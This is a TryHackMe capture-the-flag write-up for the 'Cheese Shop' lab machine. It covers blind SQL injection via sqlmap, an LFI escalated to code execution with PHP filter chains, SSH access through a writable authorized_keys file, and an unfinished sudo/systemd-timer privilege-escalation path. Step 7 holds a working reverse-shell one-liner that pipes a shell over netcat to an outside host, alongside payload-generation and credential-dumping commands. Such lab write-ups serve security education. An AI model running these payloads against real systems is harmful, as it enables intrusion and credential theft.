# Cheese Shop — TryHackMe Writeup
> **Platform:** TryHackMe | **Category:** Web, SQL Injection, LFI-to-RCE, SUID Abuse via systemd Timer

---

## Overview

This machine presents an unusually large number of open ports, most of which turn out to be decoys — a honeypot-style setup meant to waste an attacker's time (one "HTTP" port even fingerprints as a Minecraft plugin server). The real attack surface is a cheese shop web application with a login form vulnerable to time-based blind SQL injection, which also leaks a redirect to a hidden admin panel and an LFI endpoint. The LFI is escalated to full remote code execution using PHP filter chains, leading to a shell as `www-data`. Reused/leaked database credentials and a writable `authorized_keys` file provide SSH access as `comte`, and a passwordless sudo rule tied to a `systemd` timer sets up the path toward a SUID privilege escalation.

**Attack Chain:**
```
Nmap (decoy ports) → Web app discovery → SQLi (time-based blind)
→ Hidden admin panel redirect → LFI discovered → PHP filter chain RCE
→ Reverse shell as www-data → DB creds recovered → writable authorized_keys
→ SSH as comte → sudo NOPASSWD systemd timer → SUID binary setup (in progress)
```

---

## Step 1 — Reconnaissance

```bash
nmap -sV 10.66.168.77
```

The scan returns an unusually large number of open ports, most fingerprinted as consumer routers, VoIP gateways, webcams, print servers, and other unrelated devices/services — for example:

```
1218/tcp  open  http     Henry httpd (NEC Aspire WebPro http config)
1247/tcp  open  telnet   HP Integrated Lights Out telnetd
1287/tcp  open  rtsp     D-Link DCS-2130 webcam rtspd
1443/tcp  open  ms-sql-s Microsoft SQL Server 2005
49175/tcp open  http     Bukkit JSONAPI httpd for Minecraft game server
```

This pattern — dozens of implausible, unrelated service fingerprints — strongly suggests a honeypot or a firewall generating fake open ports to obscure the real attack surface. Rather than chasing every port, the plain HTTP service on the machine's IP is checked directly, since it's the most likely genuine entry point.

---

## Step 2 — Web Enumeration

Browsing to the host's IP shows a cheese-shop-themed storefront matching the CTF's theme — the real starting point.

Fuzzing the web root:

```bash
gobuster dir -u 10.66.168.77 -w big.txt
```

```
images  (Status: 301) [--> http://10.66.168.77/images/]
```

Fuzzing `/images/` further turns up nothing new. Checking the image files for embedded metadata or hidden information with `exiftool`:

```bash
exiftool cheese2.jpg
```

The output reveals the file is actually a WebP image (mismatched extension) with an improper EXIF header — one image (`cheese2.jpg`) is corrupted, and the rest appear to have had their extensions swapped. This is set aside for later — repairing the corrupted image and checking for steganographic content is a possible follow-up, but the login form is a more immediate lead.

---

## Step 3 — SQL Injection in the Login Form

The login POST request is captured:

```
POST /login.php HTTP/1.1
Host: 10.66.168.77
Content-Type: application/x-www-form-urlencoded

username=user&password=pass
```

This request is saved to a file and tested with `sqlmap`:

```bash
sqlmap -r t.txt -p username,password --batch --dbs
```

```
[00:19:54] [INFO] POST parameter 'username' appears to be 
'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
...
got a 302 redirect to 'http://10.66.168.77/secret-script.php?file=supersecretadminpanel.html'
...
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
available databases [2]:
[*] information_schema
[*] users
```

The `username` parameter is confirmed vulnerable to time-based blind SQL injection — the payload appends a `SLEEP(5)` clause, and the response is measurably delayed, confirming the injection.

As a side effect, the injected request also triggers a redirect (HTTP 302) to a hidden admin panel:

```
/secret-script.php?file=supersecretadminpanel.html
```

which exposes sections for users, messages, and orders.

---

## Step 4 — Dumping Credentials

Dumping the `users` table:

```bash
sqlmap -r t.txt -p username --batch -D users --dump
```

```
Database: users
Table: users
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+
```

Attempting to crack the MD5 hash:

```bash
hashcat -m 0 5b0c2e1b4fe1410e47f26feff7f4fc4c rockyou.txt
```

The hash doesn't crack against `rockyou.txt`, so a different route is needed.

---

## Step 5 — LFI Discovery

The admin panel's `file` parameter is tested for Local File Inclusion:

```
http://10.64.186.193/secret-script.php?file=/etc/passwd
```

The full contents of `/etc/passwd` are returned, confirming LFI and revealing two real, interactive system accounts: `comte` and `ubuntu`.

---

## Step 6 — LFI to RCE via PHP Filter Chains

The underlying page source confirms the file is passed straight into `include()` with no sanitization:

```php
<?php
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
```

This is exploited using [`php_filter_chain_generator.py`](https://github.com/synacktiv/php_filter_chain_generator), a tool that builds a chain of `php://filter` conversions which, when included, ultimately decode to and execute arbitrary PHP code — without needing to write anything to disk.

Generating a proof-of-concept payload:

```bash
python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'
```

This produces a long `php://filter/...` chain ending in `resource=php://temp`. Passing it as the `file` parameter causes the target to execute the embedded command, confirming RCE — the response includes `www-data` mixed in with filter conversion noise.

---

## Step 7 — Reverse Shell as `www-data`

A reverse shell payload is generated the same way:

```bash
python3 php_filter_chain_generator.py \
  --chain "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.138.111 443 >/tmp/f'); ?>" \
  > payload.txt
```

Listener:

```bash
sudo nc -lvnp 443
```

Triggering the payload:

```bash
curl -v "http://10.65.139.198/secret-script.php?file=$(cat payload.txt)"
```

```
Connection received on 10.65.139.198 35450
$ pwd
/var/www/html
```

---

## Step 8 — Database Credentials from Source

Listing the web root reveals the full application source, including `login.php`, which hardcodes the database credentials:

```php
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";
```

The same file also shows the login query filters out the standalone word "OR" (case-insensitive) from the username — a weak, easily bypassed SQL injection filter — and hashes passwords with plain MD5.

Confirming MySQL is only listening locally:

```bash
ss -tlnp
```

```
LISTEN   0   80   127.0.0.1:3306   0.0.0.0:*
```

Logging in locally with the recovered credentials confirms them, but updating the stored password hash doesn't help — the database account is unrelated to the SSH login for `comte`:

```bash
mysql -u comte -p'VeryCheesyPassword' -D users -e "UPDATE users SET password='...' WHERE id=1;"
```

```
comte@10.64.138.86's password:
Permission denied, please try again.
```

---

## Step 9 — SSH Access via Writable `authorized_keys`

Checking `comte`'s home directory from the `www-data` shell reveals a `.ssh` directory:

```bash
$ cd .ssh
$ ls
authorized_keys
$ cat authorized_keys
```

The file is empty but writable. An SSH key pair is generated locally and the public key is written into `authorized_keys` on the target, granting direct SSH access:

```bash
ssh comte@<target>
comte@ip-10-64-150-31:~$ whoami
comte
```

The first flag is found in `comte`'s home directory:

```
THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```

**User flag captured.**

---

## Step 10 — Privilege Escalation Path: Passwordless Sudo on a systemd Timer

Enumeration (LinPEAS) shows `comte` has passwordless sudo rights over several `systemctl` commands tied to a custom timer unit:

```
/bin/systemctl daemon-reload
/bin/systemctl restart exploit.timer
/bin/systemctl start exploit.timer
/bin/systemctl enable exploit.timer
```

Inspecting the timer and its associated service:

```bash
cat /etc/systemd/system/exploit.timer
```
```ini
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

```bash
cat /etc/systemd/system/exploit.service
```
```ini
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

The service — which runs as root when triggered by the timer — copies the `xxd` binary to `/opt/xxd` and sets the SUID bit on it. Since `comte` can control and restart the timer (but not directly edit the service), the plan is to set a short `OnBootSec` value so the service fires quickly, producing a SUID-root `xxd` binary that can then be abused to read arbitrary files or escalate further:

```ini
[Timer]
OnBootSec=5
```

*(This stage was in progress at the point of writing — reloading the daemon and restarting the timer to trigger the SUID copy of `xxd` is the next planned step toward root.)*

---

## Summary of Findings

| Step | Vulnerability | Impact |
|------|---------------|--------|
| Recon | Decoy/honeypot ports obscuring the real service | Wasted attacker time if not identified early |
| Web App | Time-based blind SQL injection in login form | Database enumeration, admin panel redirect discovered |
| Web App | Local File Inclusion via unsanitized `file` parameter | Arbitrary file read (`/etc/passwd`), RCE primitive |
| Exploitation | LFI escalated to RCE using PHP filter chains | Reverse shell as `www-data` |
| Credential Exposure | Hardcoded DB credentials in source, writable `authorized_keys` | SSH access as `comte` |
| Privilege Escalation | Passwordless sudo over a systemd timer tied to a SUID-granting service | Path toward root via SUID `xxd` |

---

## Key Takeaways

- **A flood of implausible open ports is a strong honeypot/decoy signal** — don't waste time enumerating every service; look for the one that fits the challenge's actual theme.
- **Time-based blind SQL injection is still highly effective** even when error-based and boolean-based techniques don't immediately confirm a vulnerability — `sqlmap`'s automated testing catches what manual testing might miss.
- **Weak, naive filters (like stripping the word "OR") are not a substitute for parameterized queries** — they're trivially bypassed.
- **LFI is often just one step away from RCE** — PHP filter chains allow arbitrary code execution from a pure `include()`-based LFI without needing to write files to disk or poison logs.
- **Hardcoded credentials in application source code are a common pivot point** — always check for config values sitting alongside dumped or leaked source.
- **A writable `authorized_keys` file is a direct path to persistent SSH access** — always check `.ssh` directory permissions during post-exploitation.
- **Passwordless sudo over `systemctl` commands controlling a timer/service pair can be just as dangerous as sudo over the service file itself** — if the service performs a privileged action (like granting SUID), controlling only the timer is enough to trigger it.


